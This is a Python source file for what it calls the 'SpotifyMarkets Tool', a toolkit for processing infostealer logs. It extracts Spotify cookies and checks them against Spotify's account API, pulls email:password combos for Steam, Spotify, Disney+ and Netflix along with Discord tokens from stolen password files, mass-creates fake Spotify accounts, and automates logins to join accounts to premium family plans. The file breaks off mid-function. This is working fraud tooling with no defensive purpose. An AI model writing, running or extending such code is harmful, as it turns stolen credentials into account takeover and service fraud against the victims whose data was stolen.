import os
import tkinter as tk
from tkinter import filedialog
import re
import hashlib
import http.cookiejar
from colorama import Fore, Style, init
import requests
import shutil
import keyboard
import json
import threading
import sys
import ctypes
import random
import string
import httpx
from datetime import datetime
from pystyle import Write, Colors
from uuid import uuid4
from random import choice, randint
from threading import Lock
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.webdriver.common.keys import Keys 
from selenium.webdriver.support import expected_conditions as EC 
from selenium.common.exceptions import NoSuchElementException
import http.client
import time
from keyauth import api
import logging
import asyncio
import os
import json
from playwright.async_api import async_playwright
from tkinter import Tk, filedialog
from bs4 import BeautifulSoup

config = json.load(open("config.json", encoding="utf-8"))

init(autoreset=True)

purple = Fore.MAGENTA
yellow = Fore.YELLOW
nothing = Fore.RESET
gray = Fore.LIGHTBLACK_EX
blue = Fore.BLUE
pink = Fore.LIGHTMAGENTA_EX
red = Colors.red
green = Colors.green
light_green = Colors.light_green
light_red = Colors.light_red
cyan = Colors.cyan

madeAccounts = 0
failed_accs = 0
proxy_error = 0

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def hash_file(file_path):
    hasher = hashlib.md5()
    with open(file_path, 'rb') as file:
        chunk = file.read(8192)
        while chunk:
            hasher.update(chunk)
            chunk = file.read(8192)
    return hasher.hexdigest()

def select_logs_folder():
    root = tk.Tk()
    root.withdraw()
    root_folder = filedialog.askdirectory(title="Select Logs Folder")
    return root_folder

def find_and_copy_cookies(root_folder):
    print(Fore.RED + "[ # ] Searching for Spotify cookies, please wait...")
    current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    spotify_output_path = os.path.join("Logs Output", "Spotify", current_datetime)

    if not os.path.exists(spotify_output_path):
        os.makedirs(spotify_output_path)

    spotify_file_counter = 1
    total_spotify_cookies = 0

    for folder_path, _, _ in os.walk(root_folder):
        cookies_folder = os.path.join(folder_path, 'cookies')

        if os.path.exists(cookies_folder) and os.path.isdir(cookies_folder):
            for filename in os.listdir(cookies_folder):
                file_path = os.path.join(cookies_folder, filename)
                if filename.endswith('.txt'):
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                            lines = file.readlines()
                            spotify_cookies = extract_spotify_cookies(lines)

                            if spotify_cookies:
                                spotify_result_file = os.path.join(spotify_output_path, f'spotify_cookies_{spotify_file_counter}bygaspa.txt')
                                with open(spotify_result_file, 'w', encoding='utf-8') as result:
                                    result.write('\n'.join(spotify_cookies))
                                spotify_file_counter += 1
                                total_spotify_cookies += 1
                    except (FileNotFoundError, PermissionError, UnicodeDecodeError) as e:
                        print(f"Skipping file due to error: {e}")

    print(f"{total_spotify_cookies} Spotify cookies extracted.")


def extract_spotify_cookies(lines):
    spotify_cookies = []

    for line in lines:
        if not line.startswith('#'):
            cookie = parse_cookie_line(line)

            if cookie:
                if '.spotify.com' in cookie.domain:
                    spotify_cookies.append(line.strip())

    return spotify_cookies

def append_footer_to_cookie(file_path, plan, is_sub_account, country):
    footer = (
        "                               \n "
        "                               \n "
        "==============================\n"
        f"|||***By yakuza Checker***\n"
        f"Plan: {plan}\n"
        f"Country: {country}\n"
        f"Status: {'SUB-ACCOUNT' if is_sub_account else 'OWNER'}\n"
        "|||||||| https://discord.gg/wYz4MtS4Yd |||||||||||\n"
        "================================================"
    )
    with open(file_path, 'a', encoding='utf-8') as file:
        file.write(footer)

def remove_duplicates(folder_path):
    file_hashes = set()
    deleted_cookies_count = 0
    total_files = 0

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            total_files += 1

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            file_path = os.path.join(folder_path, filename)
            file_hash = hash_file(file_path)

            # If the file's hash already exists, it's a duplicate
            if file_hash in file_hashes:
                os.remove(file_path)
                deleted_cookies_count += 1
                total_files -= 1
            else:
                file_hashes.add(file_hash)

    # print(Fore.MAGENTA +"[ # ] Deleted {deleted_cookies_count} duplicate cookies.")
    return deleted_cookies_count, total_files

def parse_cookie_line(line):
    parts = line.strip().split('\t')

    if len(parts) >= 7:
        return http.cookiejar.Cookie(
            version=0,
            name=parts[5],
            value=parts[6],
            port=None,
            port_specified=False,
            domain=parts[0],
            domain_specified=bool(parts[1]),
            domain_initial_dot=parts[0].startswith('.'),
            path=parts[2],
            path_specified=bool(parts[3]),
            secure=bool(parts[4]),
            expires=int(parts[4]) if parts[4].isdigit() else None,
            discard=False,
            comment=None,
            comment_url=None,
            rest={},
            rfc2109=False,
        )
    else:
        return None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium + Hulu",
        "free": "Free",
        "isSubAccount": "Family Owner"
    }
    return mapping.get(plan, "Unknown")

def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"

    header = (f"PLAN = {plan}\nCOUNTRY = {country}\nAutoPay = {auto_pay}\n"
              f"Trial = {trial}\nChecker\n"
              f"Spotify COOKIE :👇\n\n\n")
    return header + cookie_content

def save_file_to_folder(folder_path, file_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    shutil.copy(file_path, folder_path)

def set_console_title(valid, invalid, free):
    title = (f"SpotifyMarkets Tool || Valid: {valid} | Invalid: {invalid} | Free: {free} "
             f"|| Dev. @casco2.0 & @itsgaspaa.")
    if os.name == 'nt':
        os.system(f'title {title}')
    else:
        print(f"\33]0;{title}\a", end='', flush=True)

def checkNetscapeCookies(cookie_folder, num_threads=1):
    # Remove duplicates before checking cookies
    deleted_duplicates, total_files = remove_duplicates(cookie_folder)
    print(f"Total files loaded: {total_files}")

    counts = {'hits': 0, 'bad': 0, 'errors': 0, 'free': 0}
    current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_folder = os.path.join("spotify_output", current_datetime)

    def checkCookie(cookie):
        try:
            cookie_path = os.path.join(cookie_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                read_cookie = f.read()

                cookies = {}
                for line in read_cookie.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

                if response.status_code == 200:
                    data = response.json()
                    current_plan = data.get("currentPlan", "unknown")
                    is_sub_account = data.get("isSubAccount", False)
                    country = data.get("country", "unknown")

                    counts['hits'] += 1
                    append_footer_to_cookie(cookie_path, current_plan, is_sub_account, country)

                    if current_plan == "free":
                        counts['free'] += 1
                        print(f"{Fore.YELLOW}[L] Free | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                        save_file_to_folder(os.path.join(output_folder, "free"), cookie_path)
                    elif current_plan in ["premium", "premium_mini"]:
                        print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                        save_file_to_folder(os.path.join(output_folder, "individual"), cookie_path)
                    elif current_plan == "duo_premium":
                        print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                        save_file_to_folder(os.path.join(output_folder, "duo"), cookie_path)
                    elif current_plan in ["student_premium", "student_premium_hulu"]:
                        print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                        save_file_to_folder(os.path.join(output_folder, "student"), cookie_path)
                    elif current_plan == "family_premium_v2":
                        if is_sub_account:
                            print(f"{Fore.GREEN}[G] Family Member | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "family_member"), cookie_path)
                        else:
                            print(f"{Fore.GREEN}[W] Family Owner | {Fore.WHITE}{cookie} | Country: {country}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "family_owner"), cookie_path)
                    sys.stdout.flush()
                else:
                    counts['bad'] += 1
                    print(f"{Fore.RED}[L] Invalid | {Fore.WHITE}{cookie}{Style.RESET_ALL}")
                    sys.stdout.flush()
        except Exception as e:
            counts['errors'] += 1
            print(Fore.RED + f"Error: {e} with {cookie}" + Style.RESET_ALL)

    cookies = [f for f in os.listdir(cookie_folder) if not f.endswith('.json')]

    def worker():
        while True:
            try:
                cookie = cookies.pop(0)
            except IndexError:
                break

            checkCookie(cookie)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    input("Press enter to return\n")
    clear_screen()
    main()

def checkJsonCookies(cookie_folder, num_threads=1):
    # Remove duplicates before checking cookies
    deleted_duplicates, total_files = remove_duplicates(cookie_folder)
    print(f"Total files loaded: {total_files}")

    counts = {'hits': 0, 'bad': 0, 'errors': 0, 'free': 0}
    output_lock = threading.Lock()
    current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_folder = os.path.join("spotify_output", current_datetime)

    def checkCookie(cookie_name):
        try:
            cookie_path = os.path.join(cookie_folder, cookie_name)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = json.load(f)

                cookies = {}
                for cookie in cookies_json:
                    name = cookie.get('name')
                    value = cookie.get('value')
                    domain = cookie.get('domain')
                    path = cookie.get('path')
                    secure = cookie.get('secure', False)
                    expires = cookie.get('expires', None)

                    if name and value and domain and path:
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

                if response.status_code == 200:
                    data = response.json()
                    current_plan = data.get("currentPlan", "unknown")
                    is_sub_account = data.get("isSubAccount", False)

                    counts['hits'] += 1
                    append_footer_to_cookie(cookie_path, current_plan, is_sub_account)

                    with output_lock:
                        if current_plan == "free":
                            counts['free'] += 1
                            print(f"{Fore.YELLOW}[L] Free | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "free"), cookie_path)
                        elif current_plan in ["premium", "premium_mini"]:
                            print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "individual"), cookie_path)
                        elif current_plan == "duo_premium":
                            print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "duo"), cookie_path)
                        elif current_plan in ["student_premium", "student_premium_hulu"]:
                            print(f"{Fore.GREEN}[W] Valid | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                            save_file_to_folder(os.path.join(output_folder, "student"), cookie_path)
                        elif current_plan == "family_premium_v2":
                            if is_sub_account:
                                print(f"{Fore.BLUE}[G] Family Member | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                                save_file_to_folder(os.path.join(output_folder, "family_member"), cookie_path)
                            else:
                                print(f"{Fore.GREEN}[W] Family Owner | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                                save_file_to_folder(os.path.join(output_folder, "family_owner"), cookie_path)
                        sys.stdout.flush()
                else:
                    counts['bad'] += 1
                    with output_lock:
                        print(f"{Fore.RED}[L] Invalid | {Fore.WHITE}{cookie_name}{Style.RESET_ALL}")
                        sys.stdout.flush()
        except Exception as e:
            counts['errors'] += 1
            with output_lock:
                print(Fore.RED + f"Error: {e} with {cookie_name}" + Style.RESET_ALL)
                sys.stdout.flush()

    cookies = [f for f in os.listdir(cookie_folder) if f.endswith('.json')]

    def worker():
        while True:
            try:
                cookie = cookies.pop(0)
            except IndexError:
                break

            checkCookie(cookie)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    input("Press enter to return\n")
    clear_screen()
    main()

def get_num_threads():
    while True:
        print("Choose the speed:")
        print("1. Low")
        print("2. Balanced")
        print("3. High")
        print("4. Ultra")
        print("5. Extreme")
        print("6. Custom")
        option = input("Enter your choice (1-6): ")

        if option in ['1', '2', '3', '4', '5', '6']:
            if option == '1':
                return 7
            elif option == '2':
                return 15
            elif option == '3':
                return 30
            elif option == '4':
                return 50
            elif option == '5':
                return 100
            elif option == '6':
                custom_speed = input("Enter the custom speed: ")
                if custom_speed.isdigit():
                    return int(custom_speed)
                else:
                    print("Invalid input. Please enter a valid number.")
        else:
            print("Invalid option. Please choose a number between 1 and 6.")

#⬇⬇⬇ Spotify Gen Account⬇⬇⬇

def load_config(config_file='config.json'):
    """Load configuration from a JSON file."""
    with open(config_file, 'r', encoding='utf-8') as file:
        config = json.load(file)
    return config.get('account_password', 'default_password'), config.get('username', 'default_username')

def spotify_gen():
    set_console_title("Spotify Account Creator By Gaspa")
    session = check_if_proxy()

    account_password, username = load_config()

    thread_count = int(input(f"[ {gray}{get_current_time()} {nothing}] | [ {purple}INPUT{nothing} ] Put here the number of threads -> "))
    num_accounts = int(input(f"[ {gray}{get_current_time()} {nothing}] | [ {purple}INPUT{nothing} ] Enter the number of accounts to generate -> "))

    if thread_count > 0:
        print(f"[ {gray}{get_current_time()} {nothing}] | [ {yellow}DEB{nothing} ] Starting to gen accounts... ")

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=run_account_creation, args=(session, account_password, num_accounts, username))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

def run_account_creation(session, account_password, num_accounts, username):
    global madeAccounts
    while madeAccounts < num_accounts:
        try:
            token = client_token(session)
            csrf = get_csrf(session)
            generate_account(session, token, csrf, account_password, username)
        except Exception as e:
            print(e)

def get_current_time():
    return datetime.now().strftime("%H:%M:%S")

def get_birthday():
    day = str(randint(1, 28)).zfill(2)
    month = str(randint(1, 12)).zfill(2)
    year = str(randint(1980, 2004))
    return f"{year}-{month}-{day}"

def generate_email():
    return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=17))}@yopmail.com"

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def check_if_proxy():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
    }
    return httpx.Client(headers=headers, timeout=30)

def client_token(session):
    payload = {
        "client_data": {
            "client_id": "d8a5ed958d274c2e8ee717e6a4b0971d",
            "client_version": "1.2.10.278.g261ea664",
            "js_sdk_data": {
                "device_brand": "unknown",
                "device_model": "desktop",
                "os": "Windows",
                "os_version": "NT 10.0",
            }
        }
    }

    headers = {
        "Host": "clienttoken.spotify.com",
        "Accept": "application/json",
        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://open.spotify.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Referer": "https://open.spotify.com/",
        "Connection": "keep-alive",
        "TE": "trailers"
    }

    response = session.post('https://clienttoken.spotify.com/v1/clienttoken', headers=headers, json=payload)
    if response.status_code == 200:
        return response.json()['granted_token']['token']
    return None

def get_csrf(session):
    headers = {
        "Host": "www.spotify.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "TE": "trailers"
    }

    response = session.get('https://www.spotify.com/us/signup', headers=headers)
    if response.status_code == 200:
        return response.text.split('csrfToken')[1].split('"')[2]
    return None

def save_credentials(email, password):
    os.makedirs('input_Spotify_Adder', exist_ok=True)
    with open('input_Spotify_Adder/accounts.txt', 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def generate_account(session, token, csrf, account_password, username):
    global madeAccounts, failed_accs, proxy_error

    birthday = get_birthday()
    password = account_password
    gmail = generate_email()
    c_token = client_token(session)

    payload = {
        "account_details": {
            "birthdate": birthday,
            "consent_flags": {
                "eula_agreed": True,
                "send_email": True,
                "third_party_email": True
            },
            "display_name": username,
            "email_and_password_identifier": {
                "email": gmail,
                "password": password
            },
            "gender": random.randint(1, 2)
        },
        "callback_uri": "https://auth-callback.spotify.com/r/android/music/signup",
        "client_info": {
            "api_key": "142b583129b2df829de3656f9eb484e6",
            "app_version": "v2",
            "capabilities": [1],
            "installation_id": str(uuid4()),
            "platform": "Android-ARM"
        },
        "tracking": {
            "creation_flow": "",
            "creation_point": "client_mobile",
            "referrer": ""
        }
    }

    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip',
        'accept-language': 'en-US;q=0.5',
        "app-platform": "Android",
        'client-token': c_token,
        'connection': 'Keep-Alive',
        'Origin': 'https://www.spotify.com',
        'host': 'spclient.wg.spotify.com',
        'spotify-app-version': '8.8.0.347',
        'user-agent': 'Spotify/8.8.0.347 Android/25 (SM-G988N)',
        'x-client-id': str(uuid4()).replace('-', ''),
    }

    try:
        response = session.post('https://spclient.wg.spotify.com/signup/public/v2/account/create', headers=headers, json=payload)
        if response.status_code == 200 and 'success' in response.text:
            with threading.Lock():
                print(f"[ {gray}{get_current_time()} {nothing}] | [ {green}SUC{nothing} ] Account Successfully Created : ", end='')
                sys.stdout.flush()
                print(f"{gmail}:{password}\n")

            save_credentials(gmail, password)
            madeAccounts += 1
        else:
            failed_accs += 1
            if failed_accs >= 3:
                proxy_error += 1
    except Exception as e:
        print(e)

def run_account_creation(session, account_password, num_accounts, username):
    global madeAccounts
    while madeAccounts < num_accounts:
        try:
            token = client_token(session)
            csrf = get_csrf(session)
            generate_account(session, token, csrf, account_password, username)
        except Exception as e:
            print(e)

def load_config(config_file='config.json'):
    with open(config_file, 'r', encoding='utf-8') as file:
        config = json.load(file)
    return config.get('account_password', 'default_password'), config.get('username', 'default_username')

def spotify_gen():
    set_console_title("Spotify Account Creator By Gaspa")
    session = check_if_proxy()

    account_password, username = load_config()

    thread_count = int(input(f"[ {gray}{get_current_time()} {nothing}] | [ {purple}INPUT{nothing} ] Put here the number of threads -> "))
    num_accounts = int(input(f"[ {gray}{get_current_time()} {nothing}] | [ {purple}INPUT{nothing} ] Enter the number of accounts to generate -> "))

    if thread_count > 0:
        print(f"[ {gray}{get_current_time()} {nothing}] | [ {yellow}DEB{nothing} ] Starting to gen accounts... ")

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=run_account_creation, args=(session, account_password, num_accounts, username))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

# ⬇⬇⬇ Combo Extractor⬇⬇⬇

def find_and_extract_credentials(output_folder):
    print(f"{Fore.BLUE}Select the folder where you saved the Logs...{Fore.RESET}")

    current_dir = select_logs_folder()
    if not current_dir:
        print("Nessuna cartella selezionata.")
        return

    clear_terminal()
    xhaz()
    print(f"{Fore.YELLOW}[ # ] I'm checking out all accounts, Wait pls.....{Fore.RESET}")

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    all_credentials = {url: set() for url in ["https://store.steampowered.com/login/", "https://accounts.spotify.com", "https://www.disneyplus.com/", "https://www.netflix.com/login"]}
    discord_tokens = set()
    account_count = {site: 0 for site in ["Steam", "Spotify", "Disney", "Netflix"]}
    token_count = 0

    for root, dirs, files in os.walk(current_dir):
        for filename in files:
            if filename == "DiscordTokens.txt":
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'r', encoding='utf-8') as file:
                        lines = file.readlines()
                        for line in lines:
                            token = line.strip()
                            if token:
                                discord_tokens.add(token)
                except UnicodeDecodeError:
                    print(f"Decoding error in file: {file_path}. File skipped.")

            elif filename in ["All password.txt", "Passwords.txt"]:
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'r', encoding='utf-8') as file:
                        lines = file.readlines()
                        for url in all_credentials.keys():
                            url_pattern = re.compile(re.escape(url))
                            for i in range(len(lines)):
                                if url_pattern.search(lines[i]):
                                    email_line = lines[i + 1] if i + 1 < len(lines) else ""
                                    pass_line = lines[i + 2] if i + 2 < len(lines) else ""
                                    email = None
                                    password = None
                                    if email_line.lower().startswith(("user: ", "login: ", "username: ")):
                                        email = re.sub(r"^(USER|login|Username): ", "", email_line, flags=re.IGNORECASE).strip()
                                    if pass_line.lower().startswith(("pass: ", "password: ")):
                                        password = re.sub(r"^(PASS|password): ", "", pass_line, flags=re.IGNORECASE).strip()
                                    if email and password:
                                        credential = f"{email}:{password}"
                                        if credential not in all_credentials[url]:
                                            all_credentials[url].add(credential)
                                            account_type = next(site for site, link in {"Steam": "https://store.steampowered.com/login/", "Spotify": "https://accounts.spotify.com", "Disney": "https://www.disneyplus.com/", "Netflix": "https://www.netflix.com/login"}.items() if link == url)
                                            account_count[account_type] += 1
                                            set_console_title(f"Combo Extractor || Combos Found: | Steam: {account_count.get('Steam', 0)} | Spotify: {account_count.get('Spotify', 0)} | Disney: {account_count.get('Disney', 0)} | Netflix: {account_count.get('Netflix', 0)} | Token: {len(discord_tokens)} || Dev. @itsgaspaa.")
                except UnicodeDecodeError:
                    print(f"Decoding error in file: {file_path}. File skipped.")

    for url, credentials in all_credentials.items():
        if credentials:
            site = next(site for site, link in {"Steam": "https://store.steampowered.com/login/", "Spotify": "https://accounts.spotify.com", "Disney": "https://www.disneyplus.com/", "Netflix": "https://www.netflix.com/login"}.items() if link == url)
            custom_file_name = {"Steam": "Steam_Accounts", "Spotify": "Spotify_Accounts", "Disney": "Disney_Accounts", "Netflix": "Netflix_Accounts"}.get(site, site)
            output_file = os.path.join(output_folder, f"{custom_file_name}.txt")
            with open(output_file, 'w', encoding='utf-8') as out_file:
                out_file.write("\n".join(credentials))
            print(f"Debug: Written {len(credentials)} credentials to {output_file}")

    if discord_tokens:
        discord_output_file = os.path.join(output_folder, "DiscordTokens.txt")
        with open(discord_output_file, 'w', encoding='utf-8') as out_file:
            out_file.write("\n".join(discord_tokens))
        print(f"Debug: Written {len(discord_tokens)} tokens to {discord_output_file}")

    for site, url in {"Steam": "https://store.steampowered.com/login/", "Spotify": "https://accounts.spotify.com", "Disney": "https://www.disneyplus.com/", "Netflix": "https://www.netflix.com/login"}.items():
        custom_file_name = {"Steam": "Steam_Accounts", "Spotify": "Spotify_Accounts", "Disney": "Disney_Accounts", "Netflix": "Netflix_Accounts"}.get(site, site)
        output_file = os.path.join(output_folder, f"{custom_file_name}.txt")
        if os.path.exists(output_file):
            final_count = count_lines_in_file(output_file)
            account_count[site] = final_count
            print(f"Debug: Final count for {site} is {final_count}")

    if discord_tokens:
        discord_output_file = os.path.join(output_folder, "DiscordTokens.txt")
        token_count = count_lines_in_file(discord_output_file)
        print(f"Debug: Final token count is {token_count}")

    clear_terminal()
    xhaz()
    for account_type, count in account_count.items():
        print(f"{count} {account_type}: Account extracted.")
    print(f"{token_count} Token Discord extracted: ")

def count_lines_in_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return sum(1 for _ in file)
    except Exception as e:
        print(f"Errore nella lettura del file: {file_path}. Errore: {e}")
        return 0

# ⬇⬇⬇ Spotify Premium Adder⬇⬇⬇

init(autoreset=True)
logging.getLogger('tensorflow').setLevel(logging.ERROR)

def spotify_premium_adder():
    folder_name = "input_Spotify_Adder"
    
    def click_accept_button(driver):
        def attempt_click():
            while True:
                try:
                    pulsante = WebDriverWait(driver, 0.5).until(
                        EC.element_to_be_clickable((By.ID, "onetrust-accept-btn-handler"))
                    )
                    pulsante.click()
                    print(Fore.BLUE + "[ # ] Cookies accepted successfully")
                    break
                except Exception:
                    time.sleep(0.2)
        
        thread = threading.Thread(target=attempt_click)
        thread.start()

    def close_cookie_banner(driver):
        def attempt_click1():
            while True:
                try:
                    close_button = WebDriverWait(driver, 0.5).until(
                        EC.element_to_be_clickable((By.CLASS_NAME, "onetrust-close-btn-handler"))
                    )
                    close_button.click()
                    print(Fore.BLUE + "[ # ] Cookies accepted successfully")
                    break
                except Exception:
                    time.sleep(0.2)

        thread = threading.Thread(target=attempt_click1)
        thread.start()
    
    

    def change_country_region(driver, email, password, url):
        driver.get(url)
        wait = WebDriverWait(driver, 30)
        click_accept_button(driver)
        close_cookie_banner(driver)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "#login-username"))).send_keys(email)
        driver.find_element(By.CSS_SELECTOR, "#login-password").send_keys(password)
        driver.find_element(By.CSS_SELECTOR, "#login-button").click()
        time.sleep(5)

        try:
            error_message = driver.find_element(By.XPATH, '//div[@data-encore-id="banner"]')
            if error_message:
                print(Fore.RED + f"[ # ] Login failed for {email}. Incorrect username or password.")
                return False
        except NoSuchElementException:
            pass  

        wait.until(EC.url_contains("accounts.spotify.com"))
        print(Fore.GREEN + "[ # ] Login successfully")
        driver.get("https://www.spotify.com/it/account/profile/")
        time.sleep(4)
        
        try:
            captcha_element = driver.find_elements(By.XPATH, "//iframe[contains(@title, 'captcha')]")
            if captcha_element:
                print(Fore.RED + "[ # ] CAPTCHA detected. Exiting tool.")
                driver.quit()
                return False
        except Exception:
            pass

        try:
            language_dropdown_element = wait.until(EC.presence_of_element_located((By.ID, "country")))
            language_dropdown = Select(language_dropdown_element)
            all_options = language_dropdown.options
            if len(all_options) > 1:
                current_index = all_options.index(language_dropdown.first_selected_option)
                next_index = (current_index + 1) % len(all_options)
                language_dropdown.select_by_index(next_index)
            pulsante = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']")))
            pulsante.click()
            time.sleep(15)
            print(Fore.MAGENTA + "[ # ] Nationality successfully changed")
            return True
        except Exception:
            print(Fore.RED + "[ # ] I was unable to change the account name")
            return False

    def navigate_to_url_from_file(driver, file_path, email, password):
        try:
            with open(file_path, "r") as file:
                target_url = file.readline().strip()
            driver.get(target_url)
            wait = WebDriverWait(driver, 10)
            accetalink = wait.until(EC.element_to_be_clickable((By.XPATH, '//a[contains(@class, "Button-sc-qlcn5g-0")]')))
            accetalink.click()
            time.sleep(1)
            confermalink = wait.until(EC.element_to_be_clickable((By.XPATH, '//a[contains(@class, "Button-sc-qlcn5g-0")]')))
            confermalink.click()
            input_field = wait.until(EC.element_to_be_clickable((By.ID, "address")))
            input_field.click()
            with open(os.path.join(folder_name, "address.txt"), "r", encoding="utf-8") as file:
                indirizzo = file.read().strip()
            input_field.send_keys(indirizzo)
            input_field.send_keys(Keys.ENTER)
            confirm_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="confirm-address-dialog"]/footer/button[2]/span'))
            )
            confirm_button.click()
            print(Fore.CYAN + "[ # ] Premium added")
            
            with open(os.path.join(folder_name, "premium.txt"), "a") as f:
                f.write(f"{email}:{password}\n")
                
            time.sleep(10)
        except Exception:
            print(Fore.RED + "Errore durante la navigazione")

    def start_browser_session(email, password, link_file):
        options = webdriver.ChromeOptions()
        options.add_argument("--disable-gpu") 
        options.add_argument("--no-sandbox")  
        options.add_argument("--disable-dev-shm-usage")
        #options.add_argument("--headless")

        driver = webdriver.Chrome(options=options)
        try:
            success = change_country_region(driver, email, password, "https://accounts.spotify.com/it/login")
            if success:
                navigate_to_url_from_file(driver, link_file, email, password)
        finally:
            driver.quit()

    with open(os.path.join(folder_name, "accounts.txt"), "r") as file:
        credentials_list = [line.strip().split(":") for line in file.readlines()[:5]]

    threads = []
    for cred in credentials_list:
        if len(cred) >= 2:
            email, password = cred[0], cred[1]
            thread = threading.Thread(target=start_browser_session, args=(email, password, os.path.join(folder_name, "link.txt")))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

def load_netscape_cookies(file_path):
    """Load cookies from a Netscape-formatted file."""
    cookies = []
    with open(file_path, "r") as file:
        for line in file:
            if not line.startswith("#") and line.strip():
                parts = line.strip().split("\t")
                if len(parts) >= 7:
                    cookies.append({
                        "domain": parts[0],
                        "httpOnly": "FALSE" not in parts[1],
                        "path": parts[2],
                        "secure": "TRUE" in parts[3],
                        "expirationDate": int(parts[4]),
                        "name": parts[5],
                        "value": parts[6]
                    })
    return cookies

def save_netscape_cookies(file_path, cookies):
    """Save cookies to a Netscape-formatted file."""
    with open(file_path, "w") as file:
        for cookie in cookies:
            file.write(f"{cookie['domain']}\t{'TRUE' if cookie['httpOnly'] else 'FALSE'}\t{cookie['path']}\t{'TRUE' if cookie['secure'] else 'FALSE'}\t{cookie['expirationDate']}\t{cookie['name']}\t{cookie['value']}\n")

async def process_cookie_file(cookie_file, browser):
    """Process a single cookie file to perform actions on Spotify."""
    try:
        context = await browser.new_context()
        page = await context.new_page()

        cookies = load_netscape_cookies(cookie_file)
        if not cookies:
            print(f"Unable to load cookies from file: {cookie_file}")
            await context.close()
            return

        cookies_playwright = [
            {
                'name': cookie['name'],
                'value': cookie['value'],
                'domain': cookie['domain'],
                'path': cookie['path'],
                'expires': cookie['expirationDate'],
                'httpOnly': cookie['httpOnly'],
                'secure': cookie['secure'],
                'sameSite': 'None'
            }
            for cookie in cookies
        ]

        if cookies_playwright:
